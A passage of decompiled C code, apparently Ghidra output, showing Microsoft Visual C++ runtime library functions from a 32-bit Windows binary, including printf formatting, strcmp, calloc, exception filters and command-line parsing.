  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_264 = _File;
  local_228 = (int **)_ArgList;
  local_260 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_25c = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File == (FILE *)0x0) {
switchD_0041f3bd_caseD_9:
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar8 = &DAT_00433150;
      }
      else {
        puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00437d80)[(int)uVar4 >> 5]);
      }
      if ((puVar8[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar8 = &DAT_00433150;
        }
        else {
          puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00437d80)[(int)uVar4 >> 5]);
        }
        if ((puVar8[0x24] & 0x80) == 0) goto LAB_0041f32f;
      }
      goto switchD_0041f3bd_caseD_9;
    }
LAB_0041f32f:
    if (_Format == (char *)0x0) goto switchD_0041f3bd_caseD_9;
    local_215 = *_Format;
    local_22c = 0;
    local_224 = (int *)0x0;
    local_244 = 0;
    local_258 = (int *)0x0;
    if (local_215 == 0) {
LAB_0041fdb1:
      if (local_248 != '\0') {
        *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
      }
      goto LAB_0041fdca;
    }
    do {
      pbVar9 = (byte *)_Format + 1;
      uVar4 = 0;
      local_240 = pbVar9;
      if (local_22c < 0) break;
      if ((byte)(local_215 - 0x20) < 0x59) {
        uVar4 = (byte)(&DAT_0042b488)[(char)local_215] & 0xf;
      }
      local_244 = (uint)((byte)(&DAT_0042b4a8)[local_244 + uVar4 * 9] >> 4);
      switch(local_244) {
      case 0:
switchD_0041f3bd_caseD_0:
        local_23c = 0;
        iVar7 = __isleadbyte_l((uint)local_215,&local_254);
        if (iVar7 != 0) {
          _write_char(local_264);
          local_240 = (byte *)_Format + 2;
          if (*pbVar9 == 0) goto switchD_0041f3bd_caseD_9;
        }
        _write_char(local_264);
        break;
      case 1:
        local_21c = (int *)0xffffffff;
        local_270 = 0;
        local_25c = 0;
        local_238 = (int *)0x0;
        local_234 = 0;
        local_214 = 0;
        local_23c = 0;
        break;
      case 2:
        if (local_215 == 0x20) {
          local_214 = local_214 | 2;
        }
        else if (local_215 == 0x23) {
          local_214 = local_214 | 0x80;
        }
        else if (local_215 == 0x2b) {
          local_214 = local_214 | 1;
        }
        else if (local_215 == 0x2d) {
          local_214 = local_214 | 4;
        }
        else if (local_215 == 0x30) {
          local_214 = local_214 | 8;
        }
        break;
      case 3:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_238 = *(int **)_ArgList;
          if ((int)local_238 < 0) {
            local_214 = local_214 | 4;
            local_238 = (int *)-(int)local_238;
          }
        }
        else {
          local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 4:
        local_21c = (int *)0x0;
        break;
      case 5:
        if (local_215 == 0x2a) {
          local_228 = (int **)((int)_ArgList + 4);
          local_21c = *(int **)_ArgList;
          if ((int)local_21c < 0) {
            local_21c = (int *)0xffffffff;
          }
        }
        else {
          local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
        }
        break;
      case 6:
        if (local_215 == 0x49) {
          bVar1 = *pbVar9;
          if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
            local_214 = local_214 | 0x8000;
            local_240 = (byte *)_Format + 3;
          }
          else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
            local_214 = local_214 & 0xffff7fff;
            local_240 = (byte *)_Format + 3;
          }
          else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                   ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
            local_244 = 0;
            goto switchD_0041f3bd_caseD_0;
          }
        }
        else if (local_215 == 0x68) {
          local_214 = local_214 | 0x20;
        }
        else if (local_215 == 0x6c) {
          if (*pbVar9 == 0x6c) {
            local_214 = local_214 | 0x1000;
            local_240 = (byte *)_Format + 2;
          }
          else {
            local_214 = local_214 | 0x10;
          }
        }
        else if (local_215 == 0x77) {
          local_214 = local_214 | 0x800;
        }
        break;
      case 7:
        if ((char)local_215 < 'e') {
          if (local_215 == 100) {
LAB_0041f8a9:
            local_214 = local_214 | 0x40;
LAB_0041f8b0:
            local_224 = (int *)0xa;
LAB_0041f8ba:
            if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x20) == 0) {
                piVar3 = *(int **)_ArgList;
                if ((local_214 & 0x40) == 0) {
                  piVar11 = (int *)0x0;
                }
                else {
                  piVar11 = (int *)((int)piVar3 >> 0x1f);
                }
              }
              else {
                if ((local_214 & 0x40) == 0) {
                  piVar3 = (int *)(uint)*(ushort *)_ArgList;
                }
                else {
                  piVar3 = (int *)(int)*(short *)_ArgList;
                }
                piVar11 = (int *)((int)piVar3 >> 0x1f);
              }
            }
            else {
              local_228 = (int **)((int)_ArgList + 8);
              piVar3 = *(int **)_ArgList;
              piVar11 = *(int **)((int)_ArgList + 4);
            }
            if ((((local_214 & 0x40) != 0) && ((int)piVar11 < 1)) && ((int)piVar11 < 0)) {
              bVar12 = piVar3 != (int *)0x0;
              piVar3 = (int *)-(int)piVar3;
              piVar11 = (int *)-(int)((int)piVar11 + (uint)bVar12);
              local_214 = local_214 | 0x100;
            }
            uVar13 = CONCAT44(piVar11,piVar3);
            if ((local_214 & 0x9000) == 0) {
              piVar11 = (int *)0x0;
            }
            if ((int)local_21c < 0) {
              local_21c = (int *)0x1;
            }
            else {
              local_214 = local_214 & 0xfffffff7;
              if (0x200 < (int)local_21c) {
                local_21c = (int *)0x200;
              }
            }
            if (((uint)piVar3 | (uint)piVar11) == 0) {
              local_234 = 0;
            }
            piVar3 = (int *)local_11;
            while( true ) {
              piVar15 = piVar11;
              piVar11 = (int *)((int)local_21c + -1);
              if (((int)local_21c < 1) && (((uint)uVar13 | (uint)piVar15) == 0)) break;
              local_21c = piVar11;
              uVar13 = __aulldvrm((uint)uVar13,(uint)piVar15,(uint)local_224,(int)local_224 >> 0x1f)
              ;
              iVar7 = extraout_ECX + 0x30;
              if (0x39 < iVar7) {
                iVar7 = iVar7 + local_260;
              }
              *(char *)piVar3 = (char)iVar7;
              piVar3 = (int *)((int)piVar3 + -1);
              piVar11 = (int *)((ulonglong)uVar13 >> 0x20);
              local_268 = piVar15;
            }
            local_224 = (int *)(local_11 + -(int)piVar3);
            local_220 = (int *)((int)piVar3 + 1);
            local_21c = piVar11;
            if (((local_214 & 0x200) != 0) &&
               ((local_224 == (int *)0x0 || (*(char *)local_220 != '0')))) {
              *(char *)piVar3 = '0';
              local_224 = (int *)(local_11 + -(int)piVar3 + 1);
              local_220 = piVar3;
            }
          }
          else if ((char)local_215 < 'T') {
            if (local_215 == 0x53) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
              goto LAB_0041f6d8;
            }
            if (local_215 == 0x41) {
LAB_0041f656:
              local_215 = local_215 + 0x20;
              local_270 = 1;
LAB_0041f669:
              local_214 = local_214 | 0x40;
              local_268 = (int *)0x200;
              piVar3 = local_210;
              piVar11 = local_268;
              piVar15 = local_210;
              if ((int)local_21c < 0) {
                local_21c = (int *)0x6;
              }
              else if (local_21c == (int *)0x0) {
                if (local_215 == 0x67) {
                  local_21c = (int *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_21c) {
                  local_21c = (int *)0x200;
                }
                if (0xa3 < (int)local_21c) {
                  piVar11 = (int *)((int)local_21c + 0x15d);
                  local_220 = local_210;
                  local_258 = (int *)__malloc_crt((size_t)piVar11);
                  piVar3 = local_258;
                  piVar15 = local_258;
                  if (local_258 == (int *)0x0) {
                    local_21c = (int *)0xa3;
                    piVar3 = local_210;
                    piVar11 = local_268;
                    piVar15 = local_220;
                  }
                }
              }
              local_220 = piVar15;
              local_268 = piVar11;
              local_228 = (int **)((int)_ArgList + 8);
              local_27c = *(int **)_ArgList;
              local_278 = *(int **)((int)_ArgList + 4);
              plVar18 = &local_254;
              iVar7 = (int)(char)local_215;
              ppiVar14 = &local_27c;
              piVar11 = piVar3;
              piVar15 = local_268;
              piVar16 = local_21c;
              uVar17 = local_270;
              pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00433a0c);
              (*pcVar5)(ppiVar14,piVar11,piVar15,iVar7,piVar16,uVar17,plVar18);
              uVar4 = local_214 & 0x80;
              if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00433a18);
                (*pcVar5)(piVar11,plVar18);
              }
              if ((local_215 == 0x67) && (uVar4 == 0)) {
                plVar18 = &local_254;
                piVar11 = piVar3;
                pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00433a14);
                (*pcVar5)(piVar11,plVar18);
              }
              if (*(char *)piVar3 == '-') {
                local_214 = local_214 | 0x100;
                piVar3 = (int *)((int)piVar3 + 1);
                local_220 = piVar3;
              }
LAB_0041f80b:
              local_224 = (int *)_strlen((char *)piVar3);
            }
            else if (local_215 == 0x43) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
LAB_0041f74b:
              local_228 = (int **)((int)_ArgList + 4);
              if ((local_214 & 0x810) == 0) {
                local_210[0]._0_1_ = *_ArgList;
                local_224 = (int *)0x1;
              }
              else {
                eVar6 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList);
                if (eVar6 != 0) {
                  local_25c = 1;
                }
              }
              local_220 = local_210;
            }
            else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_0041f656;
          }
          else {
            if (local_215 == 0x58) goto LAB_0041fa0c;
            if (local_215 == 0x5a) {
              piVar3 = *(int **)_ArgList;
              local_228 = (int **)((int)_ArgList + 4);
              if ((piVar3 == (int *)0x0) || (local_220 = (int *)piVar3[1], local_220 == (int *)0x0))
              {
                local_220 = (int *)PTR_DAT_00433370;
                piVar3 = (int *)PTR_DAT_00433370;
                goto LAB_0041f80b;
              }
              local_224 = (int *)(int)*(wchar_t *)piVar3;
              if ((local_214 & 0x800) == 0) {
                local_23c = 0;
              }
              else {
                local_224 = (int *)((int)local_224 / 2);
                local_23c = 1;
              }
            }
            else {
              if (local_215 == 0x61) goto LAB_0041f669;
              if (local_215 == 99) goto LAB_0041f74b;
            }
          }
LAB_0041fbe5:
          if (local_25c == 0) {
            if ((local_214 & 0x40) != 0) {
              if ((local_214 & 0x100) == 0) {
                if ((local_214 & 1) == 0) {
                  if ((local_214 & 2) == 0) goto LAB_0041fc2e;
                  local_230 = 0x20;
                }
                else {
                  local_230 = 0x2b;
                }
              }
              else {
                local_230 = 0x2d;
              }
              local_234 = 1;
            }
LAB_0041fc2e:
            pcVar10 = (char *)((int)local_238 + (-local_234 - (int)local_224));
            if ((local_214 & 0xc) == 0) {
              _write_multi_char(0x20,(int)pcVar10,local_264);
            }
            pFVar2 = local_264;
            _write_string(local_234);
            if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
              _write_multi_char(0x30,(int)pcVar10,pFVar2);
            }
            if ((local_23c == 0) || ((int)local_224 < 1)) {
              _write_string((int)local_224);
            }
            else {
              local_268 = local_224;
              piVar3 = local_220;
              do {
                _WCh = *(wchar_t *)piVar3;
                local_268 = (int *)((int)local_268 + -1);
                piVar3 = (int *)((int)piVar3 + 2);
                eVar6 = _wctomb_s(&local_274,local_11 + 1,6,_WCh);
                if ((eVar6 != 0) || (local_274 == 0)) {
                  local_22c = -1;
                  break;
                }
                _write_string(local_274);
              } while (local_268 != (int *)0x0);
            }
            if ((-1 < local_22c) && ((local_214 & 4) != 0)) {
              _write_multi_char(0x20,(int)pcVar10,pFVar2);
            }
          }
        }
        else {
          if ('p' < (char)local_215) {
            if (local_215 == 0x73) {
LAB_0041f6d8:
              piVar3 = local_21c;
              if (local_21c == (int *)0xffffffff) {
                piVar3 = (int *)0x7fffffff;
              }
              local_228 = (int **)((int)_ArgList + 4);
              local_220 = *(int **)_ArgList;
              if ((local_214 & 0x810) == 0) {
                local_224 = local_220;
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_DAT_00433370;
                  local_224 = (int *)PTR_DAT_00433370;
                }
                for (; (piVar3 != (int *)0x0 &&
                       (piVar3 = (int *)((int)piVar3 + -1), *(char *)local_224 != '\0'));
                    local_224 = (int *)((int)local_224 + 1)) {
                }
                local_224 = (int *)((int)local_224 - (int)local_220);
              }
              else {
                if (local_220 == (int *)0x0) {
                  local_220 = (int *)PTR_u__null__00433374;
                }
                local_23c = 1;
                for (piVar11 = local_220;
                    (piVar3 != (int *)0x0 &&
                    (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar11 != L'\0'));
                    piVar11 = (int *)((int)piVar11 + 2)) {
                }
                local_224 = (int *)((int)piVar11 - (int)local_220 >> 1);
              }
              goto LAB_0041fbe5;
            }
            if (local_215 == 0x75) goto LAB_0041f8b0;
            if (local_215 != 0x78) goto LAB_0041fbe5;
            local_260 = 0x27;
LAB_0041fa38:
            local_224 = (int *)0x10;
            if ((local_214 & 0x80) != 0) {
              local_22f = (char)local_260 + 'Q';
              local_230 = 0x30;
              local_234 = 2;
            }
            goto LAB_0041f8ba;
          }
          if (local_215 == 0x70) {
            local_21c = (int *)0x8;
LAB_0041fa0c:
            local_260 = 7;
            goto LAB_0041fa38;
          }
          if ((char)local_215 < 'e') goto LAB_0041fbe5;
          if ((char)local_215 < 'h') goto LAB_0041f669;
          if (local_215 == 0x69) goto LAB_0041f8a9;
          if (local_215 != 0x6e) {
            if (local_215 != 0x6f) goto LAB_0041fbe5;
            local_224 = (int *)0x8;
            if ((local_214 & 0x80) != 0) {
              local_214 = local_214 | 0x200;
            }
            goto LAB_0041f8ba;
          }
          piVar3 = *(int **)_ArgList;
          local_228 = (int **)((int)_ArgList + 4);
          iVar7 = __get_printf_count_output();
          if (iVar7 == 0) goto switchD_0041f3bd_caseD_9;
          if ((local_214 & 0x20) == 0) {
            *piVar3 = local_22c;
          }
          else {
            *(wchar_t *)piVar3 = (wchar_t)local_22c;
          }
          local_25c = 1;
        }
        if (local_258 != (int *)0x0) {
          _free(local_258);
          local_258 = (int *)0x0;
        }
        break;
      default:
        goto switchD_0041f3bd_caseD_9;
      case 0xbad1abe1:
        break;
      }
      local_215 = *local_240;
      _Format = (char *)local_240;
      _ArgList = (va_list)local_228;
    } while (local_215 != 0);
    if ((local_244 == 0) || (local_244 == 7)) goto LAB_0041fdb1;
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_0041fdca:
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_004367b8;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_004367b4;
    do {
      piVar2 = piVar1;
      if (DAT_004367b8 == (int *)0x0) goto LAB_0041fe3f;
      piVar1 = DAT_004367b8;
    } while (*DAT_004367b8 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_004367b8[1];
    _free(_Memory);
LAB_0041fe3f:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_0041fe62();
  return;
}



void FUN_0041fe62(void)

{
  FUN_0041be7c(0xe);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_0041feb4;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_0041fe80;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_0041feb4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_0041feb4;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_0041fe80:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_0041feb4:
  return (uint)bVar5 * -2 + 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2008 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_00437d4c == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_00437d58)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_0041fff4();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_0041ffa9;
          }
        }
        else {
LAB_0041ffa9:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_00436454,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00436770 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_0041fff4(void)

{
  FUN_0041be7c(4);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2008 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + DAT_004339ac * 3);
    if ((puVar1 + DAT_004339ac * 3 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          if (DAT_004339a0 < DAT_004339a4 + DAT_004339a0) {
            iVar7 = DAT_004339a0 * 0xc;
            iVar8 = DAT_004339a0;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_004339a4 + DAT_004339a0);
          }
          uVar4 = *puVar6;
          iVar8 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar8;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2008 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_00438ebc;
  if (DAT_00438ebc == (ushort *)0x0) {
    puVar3 = &DAT_0042c760;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetenvp(void)

{
  int iVar1;
  wchar_t **ppwVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  size_t _Count;
  
  iVar5 = 0;
  pwVar4 = DAT_00435f74;
  if (DAT_00435f74 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + iVar1 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      iVar1 = FUN_00416c8a(pwVar4);
    }
    ppwVar2 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_00435f74;
    DAT_00435fa4 = ppwVar2;
    if (ppwVar2 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + _Count) {
        iVar5 = FUN_00416c8a(pwVar4);
        _Count = iVar5 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(_Count,2);
          *ppwVar2 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_00435fa4);
            DAT_00435fa4 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,_Count,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar2 = ppwVar2 + 1;
        }
      }
      _free(DAT_00435f74);
      DAT_00435f74 = (wchar_t *)0x0;
      *ppwVar2 = (wchar_t *)0x0;
      _DAT_00438ea8 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2008 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_0042035a;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_0042035a:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_004369c8 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_004367c0,0x104);
  _DAT_00435fb0 = &DAT_004367c0;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
